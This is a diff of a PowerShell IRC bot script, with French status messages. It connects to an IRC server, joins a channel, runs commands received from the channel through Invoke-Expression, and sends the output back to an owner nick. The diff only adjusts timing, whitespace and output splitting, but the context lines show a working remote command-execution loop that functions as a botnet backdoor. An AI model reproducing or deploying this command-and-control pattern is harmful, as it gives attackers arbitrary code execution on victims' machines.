@@ -25,9 +25,6 @@ function object_to_multistring{
      return $fulltext
 }
 
-
-
-
 # Connect-session
 $TCPClient = new-object Net.Sockets.TcpClient
 $TCPClient.Connect($server, $port)
@@ -38,6 +35,7 @@ $TCPClient.Connect($server, $port)
 $writer.AutoFlush = $true
 
 if($TCPClient.Connected){
+    sleep(3)
     $writer.WriteLine("NICK " + $bot)
     sleep(0.1)
     $writer.WriteLine("USER " + $bot + " 0 * :" + $bot)
@@ -48,7 +46,7 @@ if($TCPClient.Connected){
     sleep(0.1)
     $writer.WriteLine("PRIVMSG " + $channel + " :J'ai bien rejoins le channel")
     sleep(0.1)
-    $writer.Flush();
+    $writer.Flush()
 }
 else{
     write-host "Problème de connection"    
@@ -67,10 +65,6 @@ do {
     } 
 
 } until($pass)
-
-
-
-
 
 do {
     $read = $reader.ReadLine();
@@ -97,12 +91,14 @@ do {
             try {
                 $result = Invoke-Expression $command
                 $result_string = (($result | Format-list | Out-String) -replace '(?m)^\s*?\n') -replace (":","=")
+
+                [System.Collections.ArrayList]$multistring = object_to_multistring -rawsingleString $result_string
                 
-                if ([int][char]($result_string.Substring($result_string.length-1)) -eq 10) {
-                    $result_string = $result_string.Substring(0,$result_string.Length-1)
+                if (($multistring[($multistring.Count-1)].length) -eq 0) {
+                    $multistring.RemoveAt($multistring.Count-1)
                 }
-                
-                foreach ($line in (object_to_multistring -rawsingleString $result_string)) {
+
+                foreach ($line in $multistring) {
                     $writer.WriteLine("PRIVMSG " + $owner + " :" + $line)
                     Write-Host $line -Fore ($color | Get-Random)
                     Start-Sleep -Milliseconds 150
@@ -126,8 +122,6 @@ do {
             }
 
         }
-
-
     }
 
     if ($read -like '*' + $hostname + '*') {
@@ -138,9 +132,6 @@ do {
         $writer.WriteLine("PONG " + $hostname)
         write-host pong
     }
-
-
-
 
 } until($read -eq "")
 
